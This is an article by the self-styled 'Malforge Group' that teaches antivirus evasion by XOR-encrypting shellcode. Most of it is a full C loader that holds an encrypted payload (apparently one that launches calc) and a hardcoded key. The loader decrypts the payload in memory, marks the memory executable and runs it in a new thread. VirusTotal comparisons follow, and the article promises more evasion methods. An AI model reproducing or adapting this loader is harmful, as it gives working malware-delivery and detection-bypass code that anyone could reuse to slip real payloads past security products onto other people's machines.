# AV Evasion with XOR Encryption

## Introduction

Welcome to this article where we explore antivirus evasion using XOR encryption to protect shellcode. This technique bypasses static antivirus detection by encrypting the payload, though dynamic analysis can still detect it. Future articles will cover methods to evade dynamic detection as well.

The malicious payload is encrypted with XOR, making it unreadable to antivirus scanners. However, during execution, when the payload is decrypted to run, dynamic antivirus solutions can detect the malicious activity.

## XOR :

> Definition of XOR\
Definition of XOR | PCMag (e Xclusive OR) A Boolean logic operation that is widely used in cryptography as well as in [pcmag.com](https://www.pcmag.com/encyclopedia/term/xor)

**XOR (eXclusive OR) is a Boolean logic operation commonly used in cryptography and for generating parity bits in error checking and fault tolerance.** XOR takes two input bits and produces one output: 0 if the inputs match, 1 if they differ.

![image](https://github.com/user-attachments/assets/467f1016-577f-472f-b135-af99b5ea7372)

## Code

This is the code implementation used to demonstrate the XOR encryption technique :
```C
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char *data, size_t data_len, char *key, size_t key_len)
{
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++)
    {
        if (j == key_len - 1)
            j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(void)
{

    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    unsigned char calc_payload[] = {0x2c, 0x96, 0xcc, 0xd8, 0x5b, 0x9d, 0xda, 0xc9, 0x1e, 0x8a, 0xda, 0xd8, 0x21, 0x35, 0x36, 0x5c, 0x8c, 0xcd, 0xd8, 0x1, 0x84, 0xda, 0xd8, 0x3d, 0x29, 0x96, 0xcc, 0xd8, 0x23, 0x56, 0x2c, 0x9b, 0xd4, 0xd8, 0x3, 0x24, 0x82, 0xc6, 0xce, 0x2d, 0x8c, 0xcd, 0xd8, 0x24, 0x84, 0xda, 0xd8, 0x2d, 0x8f, 0xef, 0xe1, 0x21, 0x8c, 0xcd, 0xd8, 0x34, 0x4b, 0x2c, 0x8a, 0xda, 0xd0, 0x96, 0xcc, 0xd8, 0x35, 0x3a, 0x8a, 0xcb, 0xd6, 0x8a, 0xda, 0xd8, 0x2c, 0x96, 0xcc, 0xd8, 0x57, 0x9d, 0xda, 0xc9, 0x23, 0x8a, 0xda, 0xd8, 0x20, 0x48, 0x9c, 0xda, 0xde, 0x3a, 0x54, 0x9b, 0xd4, 0xd8, 0x8a, 0xda, 0xd0, 0x38, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x66, 0x6f, 0x45, 0x45, 0x4d, 0x59, 0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x4b, 0x45, 0x45, 0x45, 0x4d, 0x59, 0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x4b, 0x2d, 0x21, 0x8a, 0xd2, 0xc4, 0x33, 0x2c, 0x8c, 0xcd, 0xd8, 0x35, 0x84, 0xda, 0xd8, 0x8a, 0xd2, 0xc4, 0x3b, 0x8a, 0xdc, 0xcf, 0x24, 0x2c, 0x2a, 0x3d, 0x3b, 0x3c, 0x37, 0x38, 0x2b, 0x24, 0x3a, 0x33, 0x3f, 0x3c, 0x84, 0xda, 0xd8, 0x8a, 0xd2, 0xc4, 0x53, 0x24, 0x31, 0x9d, 0xda, 0xc9, 0x84, 0xda, 0xd8, 0x3d, 0x2c, 0x20, 0x29, 0x2d, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x32, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x36, 0x2c, 0x8a, 0xda, 0xd0, 0xe, 0x0, 0x57, 0x3c, 0x41, 0x57, 0x35, 0x3d, 0x2c, 0x8a, 0xda, 0xd0, 0x96, 0xcc, 0xd8, 0x2b, 0x9d, 0xda, 0xc9, 0x84, 0xda, 0xd8, 0x8a, 0xd2, 0xc4, 0x3a, 0x8a, 0xdc, 0xcf, 0x8a, 0xcb, 0xd6, 0x2c, 0x8a, 0xda, 0xd0, 0x96, 0xcc, 0xd8, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x8a, 0xda, 0xd0, 0x38, 0x27, 0x2c, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x29, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x33, 0x8a, 0xcb, 0xd6, 0x29, 0x12, 0x43, 0x82, 0xc6, 0xce, 0x8a, 0xdc, 0xcf, 0x29, 0x9b, 0xd4, 0xd8, 0x8a, 0xda, 0xd0, 0x11, 0x2a, 0x24, 0x8c, 0xcd, 0xd8, 0x5d, 0x84, 0xda, 0xd8, 0xe, 0x82, 0xc6, 0xce, 0x8a, 0xdc, 0xcf, 0x35, 0x24, 0x26, 0x54, 0x8a, 0xda, 0xd0, 0x34, 0x42, 0x8a, 0xdc, 0xcf, 0x2d, 0x9b, 0xd4, 0xd8, 0x8a, 0xda, 0xd0, 0x31, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x23, 0x8a, 0xda, 0xd8, 0x82, 0xc6, 0xce, 0x2d, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x24, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x84, 0xda, 0xd8, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x3a, 0x8a, 0xcb, 0xd6, 0x8a, 0xda, 0xd8, 0x7, 0x38, 0x2b, 0x29, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x3c, 0x24, 0x3d, 0x96, 0xcc, 0xd8, 0x8c, 0xcd, 0xd8, 0x12, 0x84, 0xda, 0xd8, 0x21, 0x49, 0x2d, 0x3b, 0x8a, 0xdc, 0xcf, 0x21, 0x50, 0x89, 0xf3, 0xf7, 0x8a, 0xd2, 0xc4, 0x1b, 0x2d, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x33, 0x35, 0x2c, 0x29, 0x32, 0x35, 0x22, 0x22, 0x2c, 0x9b, 0xd4, 0xd8, 0x8a, 0xda, 0xd0, 0x38, 0x23, 0x2c, 0x8c, 0xcd, 0xd8, 0x9b, 0xd4, 0xd8, 0x28, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x3e, 0x8a, 0xcb, 0xd6, 0x8a, 0xda, 0xd8, 0x2c, 0x96, 0xcc, 0xd8, 0x1a, 0x9d, 0xda, 0xc9, 0x54, 0x8a, 0xda, 0xd8, 0x82, 0xc6, 0xce, 0x8a, 0xdc, 0xcf, 0x2d, 0x45, 0x84, 0xda, 0xd8, 0x2d, 0x82, 0xc6, 0xce, 0xaf, 0xe8, 0x33, 0x8a, 0xcb, 0xd6, 0x5, 0x8a, 0xda, 0xd0, 0xac, 0xc8, 0x8a, 0xdc, 0xcf, 0x8a, 0xcb, 0xd6, 0x8a, 0xda, 0xd8, 0x3b, 0x38, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x84, 0xda, 0xd8, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x84, 0xda, 0xd8, 0x2d, 0x82, 0xc6, 0xce, 0x8a, 0xdc, 0xcf, 0x4d, 0x48, 0x17, 0x68, 0x6f, 0x8a, 0xd2, 0xc4, 0x9c, 0xda, 0xde, 0x9d, 0xda, 0xc9, 0x1e, 0x8a, 0xda, 0xd8, 0x2a, 0xb, 0x1c, 0xf, 0x3a, 0x33, 0x8a, 0xcb, 0xd6, 0x8a, 0xda, 0xd8, 0x82, 0xc6, 0xce, 0x8a, 0xdc, 0xcf};
    unsigned int calc_len = sizeof(calc_payload);
    char key[] = "mysecretkeee";

    // Allocate a buffer for payload
    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt (DeXOR) the payload
    XOR((char *)calc_payload, calc_len, key, sizeof(key));

    // Copy the payload to allocated buffer
    RtlMoveMemory(exec_mem, calc_payload, calc_len);

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, launch the payload
    if (rv != 0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
```

Two functions are displayed above :

- **Main:** This function allocates a new memory buffer using `VirtualAlloc`, then decodes the XOR-encrypted payload with the `XOR` function. Once the payload is ready, it moves the memory to another location using `RtlMoveMemory`, marks the buffer as executable with `VirtualProtect`, and finally executes it using `CreateThread`.

- **XOR:** This function is simple, with the key being crucial for decryption. While XOR is often thought of as an **encoding** method, it's actually considered **encryption** when a key is used to decrypt data. The **key** variable is passed to the XOR function, where the mathematical operation decrypts the XOR-encrypted payload.


## Proof of Concept (PoC)

To test the payload against antivirus, the following website is used.

> VirusTotal\
VirusTotal. [virustotal.com](https://www.virustotal.com/gui/home/upload)

These are the results when the payload is not encoded with XOR : 

![image](https://github.com/user-attachments/assets/4bae10b0-a021-450c-a3f4-42c23468e968)

These are the results when the payload is encoded with XOR : 

![image](https://github.com/user-attachments/assets/194b7a6a-88d9-4b0b-80fb-51eeae602b0c)

## Conclusions

 XOR encoding helps bypass some antivirus detections, but not all. Future articles will explore additional methods to evade more antivirus software.

Thanks for reading! :D

**â€” Malforge Group.**
